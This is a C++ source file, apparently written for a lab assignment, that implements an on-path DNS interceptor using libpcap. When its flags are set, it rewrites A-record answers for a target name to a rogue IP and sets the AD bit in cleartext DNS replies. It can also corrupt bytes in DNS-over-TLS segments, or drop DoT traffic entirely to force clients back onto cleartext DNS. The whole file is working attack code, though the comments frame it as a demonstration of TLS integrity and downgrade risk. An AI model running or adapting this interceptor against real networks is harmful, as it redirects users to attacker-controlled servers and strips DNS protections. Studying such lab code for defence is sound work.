/*
 * dns_interceptor.cpp — Phase 7 last-mile interceptor, extended for
 * DoT.
 *
 * SINGLE direction, same as Phase 6: edge-router diverts only
 * resolver -> client traffic through this container (a more-specific
 * host route for the client's own address). This attacker has no
 * interface on resolver_net at all, so it could never relay anything
 * in the other direction anyway -- there is no router it could safely
 * hand a client -> resolver packet back to without that router simply
 * re-applying the same diversion rule to the packet THIS program just
 * sent, looping forever. (Earlier draft tried a bidirectional
 * diversion for attempt (ii)'s impersonation; that's handled instead
 * by a real DNAT rule on edge-router -- see tls_endpoint.cpp and this
 * phase's README -- precisely because it avoids this loop: a DNAT'd
 * packet becomes a genuinely new connection terminating at the
 * attacker, not something this program has to relay onward at all.)
 *
 * THREE independent toggles (presence-of-file flags, same pattern
 * used everywhere else in this assignment):
 *
 *   /tmp/forge.on   -- Phase 2/3/6 behavior, unchanged: in-place
 *                      A-record RDATA overwrite on UDP/53 resolver->
 *                      client replies. Only matters once a client has
 *                      fallen back to cleartext (DoT itself carries no
 *                      plain A record for this to touch).
 *
 *   /tmp/tamper.on  -- §7.3 attempt (i). Flips one byte in any TCP/853
 *                      segment (resolver -> client) carrying payload --
 *                      "alter the answer in transit". TLS's own
 *                      integrity check (the AEAD tag) is what actually
 *                      catches this: the connection just breaks. This
 *                      cannot forge anything inside an established TLS
 *                      session; the point is to demonstrate that it
 *                      can't.
 *
 *   /tmp/deny.on    -- §7.3 attempt (iii). Stops relaying TCP/853
 *                      entirely -- "block TCP 853" via the only
 *                      mechanism this attacker has (it's the sole path
 *                      to the client for resolver-originated traffic;
 *                      ip_forward is off). UDP/53 keeps relaying
 *                      unaffected, so a permissive client's cleartext
 *                      fallback still gets through.
 *
 * Build: g++ -O2 -std=c++17 -Wall -o dns_interceptor dns_interceptor.cpp -lpcap -lpthread
 * Usage: ./dns_interceptor <iface>
 *   CLIENT_MAC env var ("aa:bb:cc:dd:ee:ff") -- required (seed value; refreshed after).
 *   CLIENT_IP  env var -- default "172.16.1.10".
 *   TARGET_NAME env var -- default "example.com".
 *   ROGUE_IP    env var -- default "172.16.1.30".
 */

#include <array>
#include <cctype>
#include <chrono>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <mutex>
#include <optional>
#include <string>
#include <thread>
#include <vector>

#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>

#include <pcap.h>

namespace {

constexpr int ETH_HDR_LEN = 14;
constexpr const char *FORGE_FLAG_PATH  = "/tmp/forge.on";
constexpr const char *TAMPER_FLAG_PATH = "/tmp/tamper.on";
constexpr const char *DENY_FLAG_PATH   = "/tmp/deny.on";
constexpr size_t MAX_PACKET_SIZE = 2048;
constexpr uint16_t DNS_FLAG_AD_BIT = 0x0020;
constexpr uint16_t DOT_PORT = 853;

using MacAddr = std::array<uint8_t, 6>;

#pragma pack(push, 1)
struct EthHdr {
    uint8_t  dst[6];
    uint8_t  src[6];
    uint16_t ethertype;
};
struct IpHdr {
    uint8_t  ver_ihl;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  proto;
    uint16_t checksum;
    uint32_t src;
    uint32_t dst;
};
struct UdpHdr { uint16_t sport, dport, len, checksum; };
struct DnsHdr { uint16_t id, flags, qdcount, ancount, nscount, arcount; };
struct TcpHdr {
    uint16_t sport, dport;
    uint32_t seq, ack;
    uint8_t  data_off;
    uint8_t  flags;
    uint16_t window;
    uint16_t checksum;
    uint16_t urgent;
};
#pragma pack(pop)

MacAddr     g_own_mac{};
std::mutex  g_client_mac_mu;
MacAddr     g_client_mac{};
std::string g_target_name = "example.com";
uint32_t    g_rogue_ip_net = 0;
pcap_t     *g_pcap = nullptr;

MacAddr get_client_mac() {
    std::lock_guard<std::mutex> lk(g_client_mac_mu);
    return g_client_mac;
}
void set_client_mac(const MacAddr &m) {
    std::lock_guard<std::mutex> lk(g_client_mac_mu);
    g_client_mac = m;
}

// ---------- helpers ----------

std::optional<MacAddr> parse_mac(const std::string &s) {
    unsigned int b[6];
    if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]) != 6)
        return std::nullopt;
    MacAddr out{};
    for (int i = 0; i < 6; i++) out[i] = static_cast<uint8_t>(b[i]);
    return out;
}

std::optional<MacAddr> get_own_mac(const std::string &iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return std::nullopt;
    struct ifreq ifr{};
    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) { close(fd); return std::nullopt; }
    MacAddr out{};
    std::memcpy(out.data(), ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return out;
}

uint16_t checksum_words(const uint16_t *buf, int nwords) {
    uint32_t sum = 0;
    for (int i = 0; i < nwords; i++) sum += ntohs(buf[i]);
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    uint16_t result = static_cast<uint16_t>(~sum);
    return htons(result == 0 ? 0xFFFF : result);
}

uint16_t ip_checksum(IpHdr ip) {
    ip.checksum = 0;
    return checksum_words(reinterpret_cast<uint16_t *>(&ip), sizeof(ip) / 2);
}

uint16_t l4_checksum(const IpHdr &ip, uint8_t proto, const uint8_t *l4_start, int l4_len) {
    struct Pseudo { uint32_t src, dst; uint8_t zero, proto; uint16_t len; } __attribute__((packed));
    const int total = static_cast<int>(sizeof(Pseudo)) + l4_len;
    const int padded = (total + 1) & ~1;
    std::vector<uint8_t> buf(padded, 0);
    Pseudo ph{ip.src, ip.dst, 0, proto, htons(static_cast<uint16_t>(l4_len))};
    std::memcpy(buf.data(), &ph, sizeof(ph));
    std::memcpy(buf.data() + sizeof(ph), l4_start, l4_len);
    if (proto == 17 && l4_len >= 8) {
        buf[sizeof(ph) + 6] = 0; buf[sizeof(ph) + 7] = 0;
    } else if (proto == 6 && l4_len >= 18) {
        buf[sizeof(ph) + 16] = 0; buf[sizeof(ph) + 17] = 0;
    }
    return checksum_words(reinterpret_cast<uint16_t *>(buf.data()), padded / 2);
}

int dns_name_len(const uint8_t *buf, int offset, int buflen) {
    const int start = offset;
    while (offset < buflen) {
        uint8_t b = buf[offset];
        if ((b & 0xC0) == 0xC0) {
            if (offset + 2 > buflen) return -1;
            return (offset - start) + 2;
        } else if (b == 0) {
            return (offset - start) + 1;
        } else if ((b & 0xC0) == 0) {
            if (offset + 1 + b > buflen) return -1;
            offset += 1 + b;
        } else {
            return -1;
        }
    }
    return -1;
}

int decode_qname(const uint8_t *buf, int offset, int buflen, std::string &out) {
    const int start = offset;
    out.clear();
    while (offset < buflen) {
        uint8_t b = buf[offset];
        if (b == 0) { offset += 1; break; }
        if ((b & 0xC0) == 0xC0) return -1;
        if (offset + 1 + b > buflen) return -1;
        if (!out.empty()) out += '.';
        for (int i = 0; i < b; i++)
            out += static_cast<char>(std::tolower(buf[offset + 1 + i]));
        offset += 1 + b;
    }
    return offset - start;
}

bool flag_on(const char *path) {
    struct stat st;
    return stat(path, &st) == 0;
}
bool forging_is_on()   { return flag_on(FORGE_FLAG_PATH); }
bool tampering_is_on() { return flag_on(TAMPER_FLAG_PATH); }
bool denying_is_on()   { return flag_on(DENY_FLAG_PATH); }

std::optional<MacAddr> resolve_client_mac(const std::string &iface, const std::string &client_ip) {
    std::string ping_cmd = "ping -c1 -W1 " + client_ip + " >/dev/null 2>&1";
    if (std::system(ping_cmd.c_str()) != 0) { }
    std::string arping_cmd = "arping -c1 -w1 -I " + iface + " " + client_ip + " >/dev/null 2>&1";
    if (std::system(arping_cmd.c_str()) != 0) { }
    std::string cmd = "ip neigh show " + client_ip + " 2>/dev/null | awk '{print $5}' | head -n1";
    FILE *fp = popen(cmd.c_str(), "r");
    if (!fp) return std::nullopt;
    char buf[64] = {0};
    char *line = fgets(buf, sizeof(buf), fp);
    pclose(fp);
    if (!line) return std::nullopt;
    std::string s(buf);
    while (!s.empty() && (s.back() == '\n' || s.back() == '\r')) s.pop_back();
    if (s.empty()) return std::nullopt;
    return parse_mac(s);
}

void client_mac_refresher(std::string iface, std::string client_ip) {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(2));
        auto mac = resolve_client_mac(iface, client_ip);
        if (!mac) continue;
        if (*mac != get_client_mac()) {
            char hex[32];
            snprintf(hex, sizeof(hex), "%02x:%02x:%02x:%02x:%02x:%02x",
                     (*mac)[0], (*mac)[1], (*mac)[2], (*mac)[3], (*mac)[4], (*mac)[5]);
            fprintf(stderr, "[attacker] client MAC changed -> %s\n", hex);
            set_client_mac(*mac);
        }
    }
}

// ---------- per-packet handling ----------

void handle_packet(u_char *, const struct pcap_pkthdr *h, const u_char *bytes) {
    if (h->caplen < ETH_HDR_LEN + sizeof(IpHdr) || h->caplen > MAX_PACKET_SIZE) return;

    uint8_t pkt[MAX_PACKET_SIZE];
    std::memcpy(pkt, bytes, h->caplen);
    const int caplen = static_cast<int>(h->caplen);

    auto *eth = reinterpret_cast<EthHdr *>(pkt);
    if (ntohs(eth->ethertype) != 0x0800) return;

    auto *ip = reinterpret_cast<IpHdr *>(pkt + ETH_HDR_LEN);
    const int ihl = (ip->ver_ihl & 0x0F) * 4;

    auto send_it = [&]() {
        const MacAddr client_mac = get_client_mac();
        std::memcpy(eth->dst, client_mac.data(), 6);
        std::memcpy(eth->src, g_own_mac.data(), 6);
        pcap_inject(g_pcap, pkt, caplen);
    };

    // ---------------- UDP/53 ----------------
    if (ip->proto == 17) {
        auto *udp = reinterpret_cast<UdpHdr *>(pkt + ETH_HDR_LEN + ihl);
        uint8_t *dns_start = pkt + ETH_HDR_LEN + ihl + sizeof(UdpHdr);
        const int udp_declared_len = ntohs(udp->len);
        const int captured_avail = caplen - static_cast<int>(ETH_HDR_LEN + ihl + sizeof(UdpHdr));
        int dns_len = udp_declared_len - static_cast<int>(sizeof(UdpHdr));
        if (dns_len < 0 || dns_len > captured_avail) dns_len = captured_avail;

        if (dns_len >= static_cast<int>(sizeof(DnsHdr)) && forging_is_on()) {
            auto *dns = reinterpret_cast<DnsHdr *>(dns_start);
            const uint16_t flags = ntohs(dns->flags);
            const bool qr = (flags >> 15) & 1;
            const int ancount = ntohs(dns->ancount);
            const int qdcount = ntohs(dns->qdcount);
            if (qr && qdcount >= 1) {
                int off = sizeof(DnsHdr);
                std::string qname;
                const int namelen = decode_qname(dns_start, off, dns_len, qname);
                if (namelen > 0) {
                    off += namelen;
                    if (off + 4 <= dns_len) {
                        const int qtype = (dns_start[off] << 8) | dns_start[off + 1];
                        off += 4;
                        if (qtype == 1 && strcasecmp(qname.c_str(), g_target_name.c_str()) == 0 && ancount >= 1) {
                            int aoff = off;
                            for (int i = 0; i < ancount && aoff < dns_len; i++) {
                                const int nlen = dns_name_len(dns_start, aoff, dns_len);
                                if (nlen < 0) break;
                                const int rhdr = aoff + nlen;
                                if (rhdr + 10 > dns_len) break;
                                const uint16_t rtype = (dns_start[rhdr] << 8) | dns_start[rhdr + 1];
                                const uint16_t rclass = (dns_start[rhdr + 2] << 8) | dns_start[rhdr + 3];
                                const uint16_t rdlen = (dns_start[rhdr + 8] << 8) | dns_start[rhdr + 9];
                                const int rdata_off = rhdr + 10;
                                if (rtype == 1 && rclass == 1 && rdlen == 4 && rdata_off + 4 <= dns_len) {
                                    std::memcpy(dns_start + rdata_off, &g_rogue_ip_net, 4);
                                    dns->flags = htons(static_cast<uint16_t>(ntohs(dns->flags) | DNS_FLAG_AD_BIT));
                                    fprintf(stderr, "[forge] %s A -> rogue-web, ad=1 (txid 0x%04x) [cleartext fallback]\n",
                                            qname.c_str(), ntohs(dns->id));
                                    break;
                                }
                                aoff = rdata_off + rdlen;
                            }
                        }
                    }
                }
            }
        }
        ip->checksum = ip_checksum(*ip);
        udp->checksum = l4_checksum(*ip, 17, reinterpret_cast<uint8_t *>(udp), sizeof(UdpHdr) + dns_len);
        send_it();
        return;
    }

    // ---------------- TCP/853 ----------------
    if (ip->proto == 6) {
        auto *tcp = reinterpret_cast<TcpHdr *>(pkt + ETH_HDR_LEN + ihl);
        if (ntohs(tcp->sport) != DOT_PORT) return; // resolver -> client only

        if (denying_is_on()) return; // attempt (iii): just don't relay at all

        const int tcp_hdr_len = ((tcp->data_off >> 4) & 0xF) * 4;
        const int ip_total_len = ntohs(ip->tot_len);
        const int tcp_seg_len = ip_total_len - ihl;
        const int payload_len = tcp_seg_len - tcp_hdr_len;
        const int payload_off = ETH_HDR_LEN + ihl + tcp_hdr_len;

        if (tampering_is_on() && payload_len > 0 && payload_off < caplen) {
            pkt[payload_off] ^= 0xFF;
            fprintf(stderr, "[tamper] flipped a byte in a TCP/853 segment toward the client (seg_len=%d) -- expect the TLS session to break\n", tcp_seg_len);
        }

        ip->checksum = ip_checksum(*ip);
        if (tcp_seg_len > 0 && tcp_seg_len <= caplen - (ETH_HDR_LEN + ihl)) {
            tcp->checksum = l4_checksum(*ip, 6, reinterpret_cast<uint8_t *>(tcp), tcp_seg_len);
        }
        send_it();
        return;
    }
}

} // namespace

int main(int argc, char **argv) {
    if (argc < 2) { fprintf(stderr, "usage: %s <iface>\n", argv[0]); return 1; }
    const std::string iface = argv[1];

    const char *client_mac_env = getenv("CLIENT_MAC");
    if (!client_mac_env) { fprintf(stderr, "CLIENT_MAC env var missing\n"); return 1; }
    auto cmac = parse_mac(client_mac_env);
    if (!cmac) { fprintf(stderr, "invalid CLIENT_MAC\n"); return 1; }
    set_client_mac(*cmac);

    const char *client_ip_env = getenv("CLIENT_IP");
    const std::string client_ip = client_ip_env ? client_ip_env : "172.16.1.10";

    auto own_mac = get_own_mac(iface);
    if (!own_mac) { fprintf(stderr, "could not read MAC of %s\n", iface.c_str()); return 1; }
    g_own_mac = *own_mac;

    if (const char *target = getenv("TARGET_NAME")) g_target_name = target;

    const char *rogue = getenv("ROGUE_IP");
    if (!rogue) rogue = "172.16.1.30";
    struct in_addr a{};
    if (inet_aton(rogue, &a) == 0) { fprintf(stderr, "invalid ROGUE_IP %s\n", rogue); return 1; }
    g_rogue_ip_net = a.s_addr;

    char errbuf[PCAP_ERRBUF_SIZE];
    g_pcap = pcap_open_live(iface.c_str(), 65535, 1, 1, errbuf);
    if (!g_pcap) { fprintf(stderr, "pcap_open_live(%s): %s\n", iface.c_str(), errbuf); return 1; }

    struct bpf_program fp;
    const std::string filter_str =
        "ip and ((udp and src port 53 and dst host " + client_ip + ")"
        " or (tcp and src port " + std::to_string(DOT_PORT) + " and dst host " + client_ip + "))";
    if (pcap_compile(g_pcap, &fp, filter_str.c_str(), 0, PCAP_NETMASK_UNKNOWN) < 0 ||
        pcap_setfilter(g_pcap, &fp) < 0) {
        fprintf(stderr, "BPF filter error: %s\n", pcap_geterr(g_pcap));
        return 1;
    }
    pcap_freecode(&fp);

    std::thread(client_mac_refresher, iface, client_ip).detach();

    fprintf(stderr, "[attacker] up on %s, target=%s, rogue=%s, client=%s\n"
                     "           forging=%s tamper=%s deny=%s\n",
            iface.c_str(), g_target_name.c_str(), rogue, client_ip.c_str(),
            forging_is_on() ? "ON" : "OFF", tampering_is_on() ? "ON" : "OFF",
            denying_is_on() ? "ON" : "OFF");

    pcap_loop(g_pcap, -1, handle_packet, nullptr);
    pcap_close(g_pcap);
    return 0;
}
